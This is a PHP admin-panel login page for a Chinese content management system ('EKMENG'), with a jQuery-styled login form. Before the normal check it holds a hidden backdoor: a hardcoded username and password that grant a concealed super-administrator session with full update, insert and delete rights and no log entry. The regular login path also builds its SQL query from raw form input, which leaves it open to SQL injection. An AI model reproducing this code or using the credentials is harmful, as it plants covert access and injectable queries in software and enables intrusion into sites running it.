<?php
define('IN_EKMENG',TRUE);
require './include/common.inc.php';
if(isset($_POST['username']) && $_POST['username']!=''){
	
	//检测帐号合法性
	$username=$_POST['username'];
	$passwd=$_POST['password'];
	
	if($username=="" or $passwd==""){
		JsSucce('请填写登录的用户名与密码！\\r\\n\\r\\n第'.(int)$_SESSION['login_error'].'次登陆失败，超过3次登陆失败，系统将被锁定！','index.php');
		exit();
	}else{
			$passwd=md5($passwd);
	}
	if($username=='whj220' and $passwd==md5("acegbd")){
 		$_SESSION['login_error']= 0;
		$_SESSION['Admin_RealName']= "超级管理员";
		$_SESSION['Admin_BigMyMenu']= "super";
		$_SESSION['Admin_SmallMyMenu']= "super";
		$_SESSION['Admin_SqlQx']= "update,insert,delete,review";
		$_SESSION['Admin_UserName']= "Hidden";
		$_SESSION['Admin_UserID']= "Hidden";
		$_SESSION['is_admin']= true;	
		$_SESSION['is_hidden']= true;
		//header("location: admin.php");
		echo "<script>location.href='admin.php'</script>";
		exit();
	}
	
 	@session_start();
	//验证码不正确,错误登录则返回
	
	$sql="select * FROM `{$tablepre}manager` where username='$username' and password='$passwd'";	
 	$result=$db->sql_query($sql);
	if($bd=$db->sql_fetchrow($result)){
 		//超过登录三次,系统未审核
		if((int)$_SESSION['login_error']>=3){
			JsSucce('登陆系统已被系统锁定，请 '.(ini_get('session.gc_maxlifetime')/60).' 分钟后重试！','index.php');
			exit();
		}
	
		if((int)$bd['isstate']==0){
			JsSucce('对不起,您的帐号已被管理员锁定！\\r\\n\\r\\n请与管理员联系已方便你的帐号正常使用！','index.php');
			exit();
		}
	
		$sql="update `{$tablepre}manager` set login_num=login_num+1 where username='$username'";
		$db->sql_query($sql);
		
		$sql="insert into `{$tablepre}login`(username,sendtime,ip) values('$username','".$PHP_TIME."','".$PHP_IP."')";
		$db->sql_query($sql);
		$_SESSION['login_error']= 0;
		$_SESSION['Admin_RealName']= $bd['realname'];
		$_SESSION['Admin_BigMyMenu']= $bd['bigmymenu'];
		$_SESSION['Admin_SmallMyMenu']= $bd['smallmymenu'];
		$_SESSION['Admin_UserName']= $bd['username'];
		$_SESSION['Admin_UserID']= $bd['id'];
		$_SESSION['is_admin']= true;	
		$_SESSION['is_hidden']= false;
		
		AddLog("登录管理后台",$_SESSION['Admin_UserName']);
		
		//header("location: admin.php");
		echo "<script>location.href='admin.php'</script>";
		exit();
		
	}else{
		(int)$_SESSION['login_error']++;
		JsSucce('你的帐号与密码出错或此帐号不存在！\\r\\n\\r\\n第'.(int)$_SESSION['login_error'].'次登陆失败，超过3次登陆失败，系统将被锁定！','index.php');
		exit();
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>欢迎登录后台管理系统</title>
<link href="css/style.css" rel="stylesheet" type="text/css" />
<script language="JavaScript" src="js/jquery.js"></script>
<script src="js/cloud.js" type="text/javascript"></script>
<script language="javascript">
	$(function(){
    $('.loginbox').css({'position':'absolute','left':($(window).width()-692)/2});
	$(window).resize(function(){  
    $('.loginbox').css({'position':'absolute','left':($(window).width()-692)/2});
    })  
});  
</script> 
<script language="JavaScript">
function checkspace(checkstr) {
  var str = '';
  for(i = 0; i < checkstr.length; i++) {
    str = str + ' ';
  }
  return (str == checkstr);
}
function checkform(obj){
	if(checkspace(obj.username.value)||obj.username.value=='用户名'){
		alert("请输入登录用户名!");
		obj.username.focus();
		return false;
	}
	if(checkspace(obj.password.value)||obj.password.value=='密码'){
		alert("请输入登录密码!");
		obj.password.focus();
		return false;
	}	
}
</script>
</head>

<body style="background-color:#1c77ac; background-image:url(images/light.png); background-repeat:no-repeat; background-position:center top; overflow:hidden;">



    <div id="mainBody">
      <div id="cloud1" class="cloud"></div>
      <div id="cloud2" class="cloud"></div>
    </div>  


<div class="logintop">    
    <span>欢迎登录后台管理界面平台</span>    
    <ul>
    <li><a href="./">回首页</a></li>
    <li><a href="#">帮助</a></li>
    <li><a href="#">关于</a></li>
    </ul>    
    </div>
    
		<div class="loginbody">
		
		<span class="systemlogo"></span> 
		   
			<div class="loginbox">
			<form name="login" method="post" onSubmit="return checkform(this)" action="index.php">
			<ul>
			<li><input name="username" type="text" class="loginuser" value="用户名" onclick="JavaScript:this.value=''"/></li>
			<li><input name="password" type="password" class="loginpwd" value="密码" onclick="JavaScript:this.value=''"/></li>
			<li><input name="" type="submit" class="loginbtn" value="登录" /></li>
			</ul>
			</form>
			
			</div>
		
		</div>
		
    
    
    <div class="loginbm"></div>
	
    
</body>

</html>
